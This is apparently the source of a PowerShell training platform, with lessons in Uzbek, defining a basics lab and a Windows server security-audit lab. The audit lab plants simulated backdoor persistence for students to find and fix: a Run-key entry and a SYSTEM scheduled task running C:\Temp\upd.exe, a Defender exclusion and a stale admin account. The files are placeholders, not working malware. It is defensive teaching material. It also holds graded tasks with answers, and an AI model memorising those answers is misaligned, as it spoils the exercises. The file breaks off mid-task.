import type { Lab } from '../types';
import type { WinProcess, WinService } from '../../engine/pwsh/state';
import { fileAt, isDir, nodeAt } from './helpers';
import { SECURITY_EVENTS } from './soc';

/*
 * Windows labs: the terminal is PowerShell 7 on a Windows machine. Paths are written as PowerShell users type them
 * (C:\Users\talaba, ~\Documents); String.raw keeps the backslashes readable.
 */
const W = String.raw;
const HOME = '/Users/talaba';

const T = (d: number, h: number, m: number, s = 0) => Date.UTC(2026, 10, d, h, m, s);

const baseProcs: WinProcess[] = [
  { id: 4, name: 'System', user: 'NT AUTHORITY\\SYSTEM', si: 0, ws: 0.14, cpu: 210.4 },
  { id: 688, name: 'lsass', path: 'C:\\Windows\\System32\\lsass.exe', user: 'NT AUTHORITY\\SYSTEM', si: 0, ws: 21.6, cpu: 14.2 },
  { id: 812, name: 'svchost', path: 'C:\\Windows\\System32\\svchost.exe', commandLine: 'C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p', user: 'NT AUTHORITY\\SYSTEM', si: 0, ws: 27.3, cpu: 31.7 },
  { id: 948, name: 'svchost', path: 'C:\\Windows\\System32\\svchost.exe', commandLine: 'C:\\Windows\\system32\\svchost.exe -k RPCSS -p', user: 'NT AUTHORITY\\NETWORK SERVICE', si: 0, ws: 14.1, cpu: 9.8 },
  { id: 2900, name: 'MsMpEng', path: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe', user: 'NT AUTHORITY\\SYSTEM', si: 0, ws: 182.4, cpu: 96.1, company: 'Microsoft Corporation' },
];

const baseServices: WinService[] = [
  { name: 'Dnscache', displayName: 'DNS Client', status: 'Running', startType: 'Automatic', path: 'C:\\Windows\\system32\\svchost.exe -k NetworkService -p', account: 'NT AUTHORITY\\NetworkService' },
  { name: 'Spooler', displayName: 'Print Spooler', status: 'Running', startType: 'Automatic', path: 'C:\\Windows\\System32\\spoolsv.exe' },
  { name: 'WinDefend', displayName: 'Microsoft Defender Antivirus Service', status: 'Running', startType: 'Automatic', path: '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe"', pid: 2900 },
  { name: 'wuauserv', displayName: 'Windows Update', status: 'Stopped', startType: 'Manual', path: 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p' },
  { name: 'RemoteRegistry', displayName: 'Remote Registry', status: 'Stopped', startType: 'Disabled', path: 'C:\\Windows\\system32\\svchost.exe -k localService -p', account: 'NT AUTHORITY\\LocalService' },
];

/* ── 1. PowerShell basics on an office workstation ─────────────────────── */

const APP_LOG = [
  ['08:00:02', 'INFO', 'Xizmat ishga tushdi'],
  ['08:00:05', 'INFO', 'Sozlamalar o\'qildi: C:\\ProgramData\\Qaydnoma\\config.ini'],
  ['08:03:41', 'INFO', 'Foydalanuvchi kirdi: d.karimova'],
  ['08:05:10', 'WARN', 'Disk C: 85% band'],
  ['08:12:33', 'INFO', 'Foydalanuvchi kirdi: a.tursunov'],
  ['08:20:07', 'ERROR', 'Ma\'lumotlar bazasiga ulanib bo\'lmadi (timeout)'],
  ['08:20:19', 'INFO', 'Qayta ulanish muvaffaqiyatli'],
  ['08:31:55', 'INFO', 'Sahifa topilmadi: /error.html'],
  ['08:45:02', 'WARN', 'Sertifikat 14 kundan keyin tugaydi'],
  ['09:02:48', 'INFO', 'Hisobot yaratildi: oylik-2026-11.pdf'],
  ['09:10:13', 'ERROR', 'Pochta serveri javob bermadi'],
  ['09:15:40', 'INFO', 'Foydalanuvchi chiqdi: d.karimova'],
  ['09:22:09', 'WARN', 'Disk C: 88% band'],
  ['09:30:51', 'INFO', 'Zaxira nusxa boshlandi'],
  ['09:41:26', 'ERROR', 'Zaxira nusxa: C:\\Backup ga yozish huquqi yo\'q'],
  ['09:41:30', 'WARN', 'Zaxira nusxa to\'xtatildi'],
  ['09:50:00', 'INFO', 'Rejalashtirilgan tekshiruv tugadi'],
].map(([t, l, m]) => `2026-11-17 ${t} ${l} ${m}`);
const APP_ERRORS = APP_LOG.filter((l) => l.split(' ')[2] === 'ERROR').length;

const big = (head: string, n: number) => head + 'x'.repeat(n) + '\n';

export const winBasics: Lab = {
  id: 'powershell-asoslari',
  title: 'PowerShell asoslari: Windows bilan tanishuv',
  summary: "Windows'da PowerShell: yordam, fayllar va papkalar, obyektlar quvuri (Where, Select, Sort, Group, Measure), jarayonlar, xizmatlar va foydalanuvchilar.",
  minutes: 50,
  level: 1,
  intro:
    "Siz ofisdagi `WS-OFIS-07` kompyuterida yangi ishga kirgan yordamchi administratorsiz. Terminal — **PowerShell 7**, sessiya oddiy foydalanuvchi huquqida.\n\n" +
    "PowerShell buyruqlari **Fe'l-Ot** ko'rinishida: `Get-Process` — jarayonlarni olish, `Stop-Service` — xizmatni to'xtatish. Tanish nomlar ham ishlaydi — ular taxallus: `ls` = `Get-ChildItem`, `cd` = `Set-Location`, `cat` = `Get-Content`.\n\n" +
    "Eng muhim farq: buyruqlar quvurga **matn emas, obyekt** uzatadi. Shuning uchun `grep`/`awk` o'rniga xossa nomi bilan ishlaysiz: `Get-Service | Where-Object Status -eq Running`. Yo'llar teskari chiziq bilan: `C:\\Users\\talaba`, uy papkasi — `~`. Katta-kichik harf farqlanmaydi.",
  shell: () => ({
    user: 'talaba',
    fs: {
      Users: {
        talaba: {
          Desktop: {
            'vazifa.txt': "1. Kompyuterni ko'zdan kechiring.\n2. Yuklab olinganlarni tekshiring.\n3. Hisobot papkasini tayyorlang.\n",
            'eski-hisobot.txt': 'oktyabr hisoboti (eskirgan)\n',
          },
          Documents: {
            loyihalar: { 'qaydnoma-reja.txt': 'Qaydnoma v2: eksport, ulashish, 2FA\n', 'byudjet.csv': 'band,summa\nserver,1200\nlitsenziya,800\n' },
            'parollar.txt': 'pochta parol: Bahor2026!\nwifi parol: ofis-7788\n',
            'uchrashuv.txt': 'Juma 15:00 — xavfsizlik bo\'yicha qisqa yig\'ilish\n',
          },
          Downloads: {
            'setup.exe': big('MZ', 5200),
            'invoice.pdf.exe': big('MZ', 1300),
            'shartnoma.pdf': big('%PDF-1.7', 2400),
            'rasm.png': big('PNG', 900),
          },
          AppData: { Local: { Temp: { 'tmp4F2A.tmp': '\n' } }, Roaming: {} },
        },
        Public: {},
      },
      Logs: { 'app.log': APP_LOG.join('\n') + '\n' },
      Windows: { System32: { drivers: { etc: { hosts: '# Copyright (c) Microsoft Corp.\n# localhost name resolution\n127.0.0.1 localhost\n' } } } },
      ProgramData: {},
    },
    windows: {
      computer: 'WS-OFIS-07',
      elevated: false,
      os: 'Microsoft Windows 11 Pro',
      ip: '10.10.20.57',
      hidden: [W`C:\Users\talaba\AppData`],
      processes: [
        ...baseProcs,
        { id: 5200, name: 'explorer', path: 'C:\\Windows\\explorer.exe', user: 'WS-OFIS-07\\talaba', ws: 118.2, cpu: 41.3 },
        { id: 6120, name: 'msedge', path: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe', user: 'WS-OFIS-07\\talaba', ws: 312.7, cpu: 64.9, company: 'Microsoft Corporation' },
        { id: 7044, name: 'ms-teams', path: 'C:\\Program Files\\WindowsApps\\MSTeams\\ms-teams.exe', user: 'WS-OFIS-07\\talaba', ws: 421.5, cpu: 88.2, company: 'Microsoft Corporation' },
        { id: 6550, name: 'OneDrive', path: 'C:\\Users\\talaba\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe', user: 'WS-OFIS-07\\talaba', ws: 64.3, cpu: 7.1 },
        { id: 7600, name: 'notepad', path: 'C:\\Windows\\System32\\notepad.exe', user: 'WS-OFIS-07\\talaba', ws: 18.9, cpu: 0.4 },
      ],
      services: baseServices,
      users: [
        { name: 'Administrator', enabled: false, description: 'Built-in account for administering the computer/domain' },
        { name: 'DefaultAccount', enabled: false, description: 'A user account managed by the system.' },
        { name: 'Guest', enabled: false, description: 'Built-in account for guest access to the computer/domain' },
        { name: 'talaba', enabled: true, description: '', lastLogon: T(17, 7, 58) },
      ],
      groups: [
        { name: 'Administrators', description: 'Administrators have complete and unrestricted access to the computer/domain', members: ['it-admin'] },
        { name: 'Users', description: 'Users are prevented from making accidental or intentional system-wide changes', members: ['talaba'] },
      ],
    },
  }),
  tasks: [
    {
      id: 'whoami',
      teach: ['whoami.exe'],
      text: 'Avval o\'zingizni aniqlang: qaysi kompyuterda, kim bo\'lib ishlayapsiz?',
      hint: '`whoami` — natija `kompyuter\\foydalanuvchi` ko\'rinishida.',
      solution: ['whoami'],
      check: ({ line, output }) => /^whoami$/i.test(line) && output.includes('ws-ofis-07\\talaba'),
    },
    {
      id: 'groups',
      teach: ['whoami.exe /groups'],
      text: 'Sessiyangiz administrator huquqidami? Guruhlaringizni ko\'ring.',
      hint: '`whoami /groups` — **Medium Mandatory Level**: oddiy huquq. Administrator sessiyasida High bo\'lardi.',
      solution: ['whoami /groups'],
      check: ({ output }) => output.includes('Medium Mandatory Level'),
    },
    {
      id: 'location',
      teach: ['Get-Location'],
      text: 'Hozir qaysi papkadasiz?',
      hint: '`Get-Location` (yoki taxallusi `pwd`).',
      solution: ['Get-Location'],
      check: ({ output }) => output.includes('C:\\Users\\talaba'),
    },
    {
      id: 'help',
      teach: ['Get-Help', 'Get-Help -Examples'],
      text: '`Get-ChildItem` (ya\'ni `ls`) buyrug\'idan qanday foydalanishni misollar bilan ko\'ring.',
      hint: '`Get-Help Get-ChildItem -Examples`',
      solution: ['Get-Help Get-ChildItem -Examples'],
      check: ({ line, output }) => /get-help|help|man/i.test(line) && output.includes('EXAMPLES'),
    },
    {
      id: 'command',
      teach: ['Get-Command', 'Get-Command -Noun'],
      text: 'Jarayonlar (Process) bilan ishlaydigan qanday buyruqlar bor?',
      hint: '`Get-Command -Noun Process` — Get-, Stop-... bir xil ot bilan.',
      solution: ['Get-Command -Noun Process'],
      check: ({ output }) => output.includes('Get-Process') && output.includes('Stop-Process'),
    },
    {
      id: 'gci',
      teach: ['Get-ChildItem'],
      text: 'Uy papkangizda nimalar bor?',
      hint: '`Get-ChildItem` (yoki `ls`, `dir`). Mode ustunida `d` — papka.',
      solution: ['Get-ChildItem'],
      check: ({ output }) => output.includes('Documents') && output.includes('Downloads') && !output.includes('AppData'),
    },
    {
      id: 'force',
      teach: ['Get-ChildItem -Force'],
      text: "Windows'da ham yashirin papkalar bor (nuqta bilan emas, **Hidden** belgisi bilan). Ularni ham ko'rsating.",
      hint: '`Get-ChildItem -Force` — AppData paydo bo\'ladi, Mode ustunida `h`.',
      solution: ['Get-ChildItem -Force'],
      check: ({ output }) => /d--h-.*AppData/.test(output),
    },
    {
      id: 'cd',
      teach: ['Set-Location'],
      text: 'Ish stoli (Desktop) papkasiga o\'ting.',
      hint: '`Set-Location Desktop` yoki `cd desktop` — katta-kichik harf farqi yo\'q.',
      solution: ['Set-Location Desktop'],
      check: ({ state }) => state.cwd === `${HOME}/Desktop`,
    },
    {
      id: 'cat',
      teach: ['Get-Content'],
      text: 'Ish stolidagi vazifalar faylini o\'qing.',
      hint: '`Get-Content vazifa.txt` (yoki `cat vazifa.txt`).',
      solution: ['Get-Content vazifa.txt'],
      check: ({ output }) => output.includes('Hisobot papkasini'),
    },
    {
      id: 'recurse',
      teach: ['Get-ChildItem -Recurse', 'Get-ChildItem -Filter'],
      text: 'Hujjatlar (`~\\Documents`) va uning ichki papkalaridagi barcha `.txt` fayllarni toping.',
      hint: '`Get-ChildItem ~\\Documents -Recurse -Filter *.txt`',
      solution: [W`Get-ChildItem ~\Documents -Recurse -Filter *.txt`],
      check: ({ output }) => output.includes('qaydnoma-reja.txt') && output.includes('parollar.txt') && !output.includes('byudjet.csv'),
    },
    {
      id: 'sls',
      teach: ['Select-String', 'Select-String -Path'],
      text: "Kimdir parollarni ochiq matnda saqlaganmi? Hujjatlardagi `.txt` fayllar ichidan \"parol\" so'zini qidiring.",
      hint: '`Select-String parol -Path ~\\Documents\\*.txt` — natija `fayl:qator:matn`. Parollar ochiq faylda bo\'lmasligi kerak: parol menejeri ishlating.',
      solution: [W`Select-String parol -Path ~\Documents\*.txt`],
      check: ({ output }) => /parollar\.txt:1:/.test(output),
    },
    {
      id: 'downloads',
      teach: ['Get-ChildItem -File'],
      text: 'Yuklab olinganlar (`~\\Downloads`) papkasidagi fayllarni ko\'ring.',
      hint: '`Get-ChildItem ~\\Downloads -File`',
      solution: [W`Get-ChildItem ~\Downloads -File`],
      check: ({ output }) => output.includes('invoice.pdf.exe') && output.includes('setup.exe'),
    },
    {
      id: 'gm',
      teach: ['Get-Member'],
      text: 'Har bir fayl — obyekt. Unda qanday xossalar borligini bilib oling.',
      hint: '`Get-ChildItem ~\\Downloads | Get-Member` — Name, Length, Extension, LastWriteTime...',
      solution: [W`Get-ChildItem ~\Downloads | Get-Member`],
      check: ({ output }) => output.includes('TypeName: System.IO.FileInfo') && output.includes('Extension'),
    },
    {
      id: 'double-ext',
      teach: ['Where-Object', 'Where-Object -like'],
      text: "Ikki kengaytmali fayl — keng tarqalgan aldov: `.pdf` ga o'xshaydi, aslida dastur. Nomi `*.pdf.exe` bo'lgan faylni filtr bilan toping.",
      hint: "`Get-ChildItem ~\\Downloads | Where-Object { $_.Name -like '*.pdf.exe' }` — `$_` — quvurdagi joriy obyekt.",
      solution: [W`Get-ChildItem ~\Downloads | Where-Object { $_.Name -like '*.pdf.exe' }`],
      check: ({ output }) => output.includes('invoice.pdf.exe') && !output.includes('setup.exe'),
    },
    {
      id: 'select',
      teach: ['Select-Object', 'Select-Object -Property'],
      text: 'Yuklab olinganlarning faqat nomi, hajmi va kengaytmasini jadval qiling.',
      hint: '`Get-ChildItem ~\\Downloads | Select-Object Name, Length, Extension`',
      solution: [W`Get-ChildItem ~\Downloads | Select-Object Name, Length, Extension`],
      check: ({ output }) => /Name\s+Length\s+Extension/.test(output) && output.includes('.png'),
    },
    {
      id: 'sort',
      teach: ['Sort-Object', 'Sort-Object -Descending', 'Select-Object -First N'],
      text: 'Eng katta yuklab olingan fayl qaysi?',
      hint: '`Get-ChildItem ~\\Downloads | Sort-Object Length -Descending | Select-Object -First 1`',
      solution: [W`Get-ChildItem ~\Downloads | Sort-Object Length -Descending | Select-Object -First 1`],
      check: ({ output }) => output.includes('setup.exe') && !output.includes('rasm.png'),
    },
    {
      id: 'tail',
      teach: ['Get-Content -Tail N'],
      text: '`C:\\Logs\\app.log` ilova jurnalining oxirgi 5 qatorini ko\'ring.',
      hint: '`Get-Content C:\\Logs\\app.log -Tail 5`',
      solution: [W`Get-Content C:\Logs\app.log -Tail 5`],
      check: ({ line, output }) => /-tail/i.test(line) && output.split('\n').length === 5,
    },
    {
      id: 'errors',
      teach: ['Select-String -CaseSensitive', 'Measure-Object'],
      text: "Jurnalda nechta **ERROR** qatori bor? Katta harflarni farqlang (\"error.html\" hisobga kirmasin).",
      hint: '`Select-String ERROR -Path C:\\Logs\\app.log -CaseSensitive | Measure-Object` — Count qatoriga qarang.',
      solution: [W`Select-String ERROR -Path C:\Logs\app.log -CaseSensitive | Measure-Object`],
      check: ({ output }) => new RegExp(`Count\\s+: ${APP_ERRORS}\\b`).test(output),
    },
    {
      id: 'group',
      teach: ['ForEach-Object', 'Group-Object', 'Group-Object -NoElement'],
      text: "Har bir darajadan (INFO, WARN, ERROR) nechtadan? Har qatorning 3-so'zini oling va guruhlang.",
      hint: "`Get-Content C:\\Logs\\app.log | ForEach-Object { $_.Split(' ')[2] } | Group-Object -NoElement` — Split bo'laklarga ajratadi, [2] — uchinchisi (sanoq 0 dan).",
      solution: [W`Get-Content C:\Logs\app.log | ForEach-Object { $_.Split(' ')[2] } | Group-Object -NoElement`],
      check: ({ output }) => /Count\s+Name/.test(output) && new RegExp(`\\b${APP_ERRORS} ERROR`).test(output) && output.includes('WARN'),
    },
    {
      id: 'processes',
      teach: ['Get-Process'],
      text: 'Kompyuterda qanday dasturlar ishlayapti?',
      hint: '`Get-Process` (yoki `ps`). WS(M) — xotira MB da, CPU(s) — protsessor vaqti soniyalarda.',
      solution: ['Get-Process'],
      check: ({ output }) => output.includes('ProcessName') && output.includes('ms-teams'),
    },
    {
      id: 'top-mem',
      text: "Qaysi 3 ta jarayon eng ko'p xotira ishlatmoqda?",
      hint: '`Get-Process | Sort-Object WS -Descending | Select-Object -First 3` — WS: ishchi xotira (baytlarda).',
      solution: ['Get-Process | Sort-Object WS -Descending | Select-Object -First 3'],
      check: ({ output }) => {
        const rows = output.split('\n').filter((l) => /\d+\s+\d+\s+\S+$/.test(l));
        return rows.length === 3 && rows[0]!.includes('ms-teams');
      },
    },
    {
      id: 'services',
      teach: ['Get-Service', 'Where-Object -eq'],
      text: 'Faqat ishlab turgan xizmatlarni ko\'rsating.',
      hint: '`Get-Service | Where-Object Status -eq Running` — blokisiz qisqa yozuv.',
      solution: ['Get-Service | Where-Object Status -eq Running'],
      check: ({ output }) => output.includes('WinDefend') && !output.includes('Stopped'),
    },
    {
      id: 'fl',
      teach: ['Format-List', 'Format-List -Property'],
      text: 'Antivirus xizmati (`WinDefend`) haqida nomi, ko\'rinadigan nomi, holati va ishga tushish turini ro\'yxat ko\'rinishida chiqaring.',
      hint: '`Get-Service WinDefend | Format-List Name, DisplayName, Status, StartType`',
      solution: ['Get-Service WinDefend | Format-List Name, DisplayName, Status, StartType'],
      check: ({ output }) => /StartType\s+: Automatic/.test(output) && /Status\s+: Running/.test(output),
    },
    {
      id: 'users',
      teach: ['Get-LocalUser'],
      text: 'Kompyuterda qaysi lokal akkauntlar **yoqilgan**?',
      hint: '`Get-LocalUser | Where-Object Enabled -eq $true` — `$true` — PowerShell\'dagi "rost" qiymati.',
      solution: ['Get-LocalUser | Where-Object Enabled -eq $true'],
      check: ({ output }) => output.includes('talaba') && !output.includes('Guest'),
    },
    {
      id: 'mkdir',
      teach: ['New-Item', 'New-Item -ItemType'],
      text: 'Hujjatlar ichida `hisobot` papkasini yarating.',
      hint: '`New-Item ~\\Documents\\hisobot -ItemType Directory` (qisqasi: `mkdir ~\\Documents\\hisobot`).',
      solution: [W`New-Item ~\Documents\hisobot -ItemType Directory`],
      check: ({ state }) => isDir(state, `${HOME}/Documents/hisobot`),
    },
    {
      id: 'out-file',
      teach: ['Out-File', 'Out-File -FilePath'],
      text: 'Ishlayotgan jarayonlar ro\'yxatini `~\\Documents\\hisobot\\jarayonlar.txt` ga saqlang.',
      hint: '`Get-Process | Out-File ~\\Documents\\hisobot\\jarayonlar.txt` (yoki `> fayl`).',
      solution: [W`Get-Process | Out-File ~\Documents\hisobot\jarayonlar.txt`],
      check: ({ state }) => (fileAt(state, `${HOME}/Documents/hisobot/jarayonlar.txt`) ?? '').includes('ms-teams'),
    },
    {
      id: 'copy',
      teach: ['Copy-Item', 'Copy-Item -Destination'],
      text: 'Ilova jurnalini (`C:\\Logs\\app.log`) hisobot papkasiga nusxalang.',
      hint: '`Copy-Item C:\\Logs\\app.log ~\\Documents\\hisobot` — manzil papka bo\'lsa, fayl uning ichiga tushadi.',
      solution: [W`Copy-Item C:\Logs\app.log ~\Documents\hisobot`],
      check: ({ state }) => (fileAt(state, `${HOME}/Documents/hisobot/app.log`) ?? '').includes('ERROR'),
    },
    {
      id: 'remove',
      teach: ['Remove-Item', 'Test-Path'],
      text: "Ish stolidagi eskirgan `eski-hisobot.txt` ni o'chiring va o'chganini `Test-Path` bilan tekshiring.",
      hint: '`Remove-Item ~\\Desktop\\eski-hisobot.txt`, keyin `Test-Path ~\\Desktop\\eski-hisobot.txt` → False.',
      solution: [W`Remove-Item ~\Desktop\eski-hisobot.txt`, W`Test-Path ~\Desktop\eski-hisobot.txt`],
      check: ({ state }) => nodeAt(state, `${HOME}/Desktop/eski-hisobot.txt`) === null,
    },
    {
      id: 'challenge',
      challenge: true,
      teach: ['Export-Csv'],
      text: "Mustaqil vazifa: yuklab olinganlar ichidagi barcha `.exe` fayllarning nomi va hajmini `~\\Documents\\hisobot\\exe.csv` ga CSV qilib saqlang.",
      hint: 'Filtr, ikki xossani tanlash va CSV ga eksport — uchta buyruq bitta quvurda.',
      solution: [W`Get-ChildItem ~\Downloads -Filter *.exe | Select-Object Name, Length | Export-Csv ~\Documents\hisobot\exe.csv`],
      check: ({ state }) => {
        const csv = fileAt(state, `${HOME}/Documents/hisobot/exe.csv`) ?? '';
        return csv.startsWith('"Name","Length"') && csv.includes('"invoice.pdf.exe"') && csv.includes('"setup.exe"') && !csv.includes('.png');
      },
    },
  ],
};

/* ── 2. Hardening audit of an application server ───────────────────────── */

const BASELINE_SERVICES = [
  ['Dnscache', 'Automatic'],
  ['Fax', 'Manual'],
  ['QaydnomaApp', 'Automatic'],
  ['RemoteRegistry', 'Disabled'],
  ['Spooler', 'Automatic'],
  ['TermService', 'Manual'],
  ['WinDefend', 'Automatic'],
  ['WinRM', 'Automatic'],
  ['wuauserv', 'Manual'],
];

export const winAudit: Lab = {
  id: 'windows-server-auditi',
  title: 'Windows server auditi: ishga tushirishdan oldin',
  summary: "Administrator sifatida serverni tekshirish va tuzatish: akkauntlar, admin guruhi, ochiq portlar, xizmatlar va asosiy holat (baseline), firewall, Defender, autorun va rejalashtirilgan vazifalar.",
  minutes: 55,
  level: 2,
  intro:
    "`SRV-APP-02` — Qaydnoma ilovasi uchun tayyorlangan Windows Server 2022. Ertaga u production'ga o'tadi; uni sozlagan odam ishdan ketgan. Vazifangiz — xavfsizlik auditi: topilmalarni aniqlash va shu yerning o'zida tuzatish.\n\n" +
    "Bu safar PowerShell **administrator sifatida** ochilgan — xizmat, firewall va Defender sozlamalarini o'zgartirish mumkin. `C:\\Audit\\baseline-services.csv` — toza o'rnatmadan olingan xizmatlar ro'yxati (asosiy holat).\n\n" +
    "Har bir topilmani o'zingiz uchun yozib boring: nima topildi → nega xavfli → qanday tuzatildi.",
  shell: () => ({
    user: 'it-admin',
    fs: {
      Users: { 'it-admin': { Desktop: {}, Documents: {} }, Public: {} },
      Audit: { 'baseline-services.csv': ['"Name","StartType"', ...BASELINE_SERVICES.map(([n, s]) => `"${n}","${s}"`)].join('\n') + '\n' },
      Temp: { 'upd.exe': big('MZ', 3100), 'install.log': "helper o'rnatildi\n" },
      'Program Files': { Qaydnoma: { 'qaydnoma.exe': big('MZ', 8000), 'config.ini': '[app]\nport=8080\n' } },
      Windows: { System32: { 'tlntsvr.exe': big('MZ', 900) } },
    },
    windows: {
      computer: 'SRV-APP-02',
      ip: '10.10.20.22',
      processes: [
        ...baseProcs,
        { id: 1100, name: 'svchost', path: 'C:\\Windows\\System32\\svchost.exe', commandLine: 'C:\\Windows\\System32\\svchost.exe -k termsvcs -s TermService', user: 'NT AUTHORITY\\NETWORK SERVICE', si: 0, ws: 19.4, cpu: 4.2 },
        { id: 1240, name: 'svchost', path: 'C:\\Windows\\System32\\svchost.exe', commandLine: 'C:\\Windows\\system32\\svchost.exe -k localService -p -s RemoteRegistry', user: 'NT AUTHORITY\\LOCAL SERVICE', si: 0, ws: 7.8, cpu: 0.6 },
        { id: 1310, name: 'svchost', path: 'C:\\Windows\\System32\\svchost.exe', commandLine: 'C:\\Windows\\System32\\svchost.exe -k NetworkService -p -s WinRM', user: 'NT AUTHORITY\\NETWORK SERVICE', si: 0, ws: 11.2, cpu: 1.9 },
        { id: 1880, name: 'tlntsvr', path: 'C:\\Windows\\System32\\tlntsvr.exe', user: 'NT AUTHORITY\\SYSTEM', si: 0, ws: 5.1, cpu: 0.3 },
        { id: 3010, name: 'qaydnoma', path: 'C:\\Program Files\\Qaydnoma\\qaydnoma.exe', commandLine: '"C:\\Program Files\\Qaydnoma\\qaydnoma.exe" --port 8080', user: 'SRV-APP-02\\svc_qaydnoma', si: 0, ws: 96.4, cpu: 52.8 },
      ],
      services: [
        ...baseServices.filter((s) => s.name !== 'RemoteRegistry'),
        { name: 'RemoteRegistry', displayName: 'Remote Registry', status: 'Running', startType: 'Automatic', path: 'C:\\Windows\\system32\\svchost.exe -k localService -p', account: 'NT AUTHORITY\\LocalService', pid: 1240 },
        { name: 'TermService', displayName: 'Remote Desktop Services', status: 'Running', startType: 'Manual', path: 'C:\\Windows\\System32\\svchost.exe -k termsvcs', account: 'NT Authority\\NetworkService', pid: 1100 },
        { name: 'WinRM', displayName: 'Windows Remote Management (WS-Management)', status: 'Running', startType: 'Automatic', path: 'C:\\Windows\\System32\\svchost.exe -k NetworkService -p', account: 'NT AUTHORITY\\NetworkService', pid: 1310 },
        { name: 'TlntSvr', displayName: 'Telnet', status: 'Running', startType: 'Automatic', path: 'C:\\Windows\\System32\\tlntsvr.exe', pid: 1880 },
        { name: 'QaydnomaApp', displayName: 'Qaydnoma Web Application', status: 'Running', startType: 'Automatic', path: '"C:\\Program Files\\Qaydnoma\\qaydnoma.exe" --port 8080', account: '.\\svc_qaydnoma', pid: 3010 },
      ],
      users: [
        { name: 'Administrator', enabled: true, description: 'Built-in account for administering the computer/domain', lastLogon: T(16, 18, 2), passwordLastSet: Date.UTC(2026, 6, 1) },
        { name: 'Guest', enabled: false, description: 'Built-in account for guest access to the computer/domain' },
        { name: 'it-admin', enabled: true, description: "IT bo'limi", lastLogon: T(17, 8, 40), passwordLastSet: Date.UTC(2026, 9, 3) },
        { name: 'oldadmin', enabled: true, description: 'IT (2026-05 da ishdan ketgan)', lastLogon: Date.UTC(2026, 4, 2, 17, 31), passwordLastSet: Date.UTC(2025, 10, 20) },
        { name: 'svc_qaydnoma', enabled: true, description: 'Qaydnoma xizmat akkaunti', lastLogon: T(17, 6, 0), passwordLastSet: Date.UTC(2026, 8, 15) },
        { name: 'test', enabled: true, description: '', passwordLastSet: Date.UTC(2024, 2, 11) },
      ],
      groups: [
        { name: 'Administrators', description: 'Administrators have complete and unrestricted access to the computer/domain', members: ['Administrator', 'it-admin', 'oldadmin'] },
        { name: 'Remote Desktop Users', description: 'Members in this group are granted the right to logon remotely', members: ['test'] },
        { name: 'Users', description: 'Users are prevented from making accidental or intentional system-wide changes', members: ['it-admin', 'oldadmin', 'svc_qaydnoma', 'test'] },
      ],
      connections: [
        { localAddress: '0.0.0.0', localPort: 23, remoteAddress: '0.0.0.0', remotePort: 0, state: 'Listen', pid: 1880 },
        { localAddress: '0.0.0.0', localPort: 445, remoteAddress: '0.0.0.0', remotePort: 0, state: 'Listen', pid: 4 },
        { localAddress: '0.0.0.0', localPort: 3389, remoteAddress: '0.0.0.0', remotePort: 0, state: 'Listen', pid: 1100 },
        { localAddress: '0.0.0.0', localPort: 5985, remoteAddress: '0.0.0.0', remotePort: 0, state: 'Listen', pid: 1310 },
        { localAddress: '0.0.0.0', localPort: 8080, remoteAddress: '0.0.0.0', remotePort: 0, state: 'Listen', pid: 3010 },
        { localAddress: '10.10.20.22', localPort: 3389, remoteAddress: '10.10.20.31', remotePort: 51544, state: 'Established', pid: 1100 },
      ],
      firewall: [
        { name: 'RemoteDesktop-UserMode-In-TCP', displayName: 'Remote Desktop - User Mode (TCP-In)', enabled: true, direction: 'Inbound', action: 'Allow', localPort: '3389', protocol: 'TCP', remoteAddress: '10.10.20.0/24' },
        { name: 'WINRM-HTTP-In-TCP', displayName: 'Windows Remote Management (HTTP-In)', enabled: true, direction: 'Inbound', action: 'Allow', localPort: '5985', protocol: 'TCP', remoteAddress: '10.10.20.0/24' },
        { name: 'FPS-SMB-In-TCP', displayName: 'File and Printer Sharing (SMB-In)', enabled: true, direction: 'Inbound', action: 'Allow', localPort: '445', protocol: 'TCP', remoteAddress: '10.10.20.0/24' },
        { name: 'Qaydnoma-8080', displayName: 'Qaydnoma App (TCP 8080)', enabled: true, direction: 'Inbound', action: 'Allow', localPort: '8080', protocol: 'TCP' },
        { name: 'Telnet-In', displayName: 'Telnet Server', enabled: true, direction: 'Inbound', action: 'Allow', localPort: '23', protocol: 'TCP' },
      ],
      registry: {
        'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run': { VMwareTools: '"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe" -n vmusr', Updater: 'C:\\Temp\\upd.exe /silent' },
        'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run': {},
      },
      tasks: [
        { path: '\\', name: 'TempCleanup', state: 'Ready', execute: 'C:\\Temp\\upd.exe', arguments: '/silent', author: 'SRV-APP-02\\oldadmin', runAs: 'SYSTEM', trigger: 'Daily 03:00' },
        { path: '\\Microsoft\\Windows\\Defrag\\', name: 'ScheduledDefrag', state: 'Ready', execute: '%windir%\\system32\\defrag.exe', arguments: '-c -h -o -$' },
        { path: '\\Microsoft\\Windows\\WindowsUpdate\\', name: 'Scheduled Start', state: 'Ready', execute: 'C:\\Windows\\system32\\sc.exe', arguments: 'start wuauserv' },
      ],
      defender: { realtime: false, exclusionPaths: ['C:\\Temp'], signatures: [{ file: 'upd.exe', threat: 'Backdoor:Win32/Lab.RemoteAdmin' }] },
      hotfixes: [
        { id: 'KB5034439', description: 'Security Update', installedOn: Date.UTC(2026, 4, 14) },
        { id: 'KB5039227', description: 'Security Update', installedOn: Date.UTC(2026, 6, 9) },
        { id: 'KB5041160', description: 'Security Update', installedOn: Date.UTC(2026, 7, 12) },
      ],
    },
  }),
  tasks: [
    {
      id: 'os',
      teach: ['Get-CimInstance', 'Get-CimInstance Win32_OperatingSystem'],
      text: 'Server qaysi operatsion tizimda va qachon oxirgi marta qayta yuklangan?',
      hint: '`Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, LastBootUpTime`',
      solution: ['Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, LastBootUpTime'],
      check: ({ output }) => output.includes('Windows Server 2022') && output.includes('LastBootUpTime'),
    },
    {
      id: 'hotfix',
      teach: ['Get-HotFix'],
      text: "Oxirgi xavfsizlik yangilanishi qachon o'rnatilgan?",
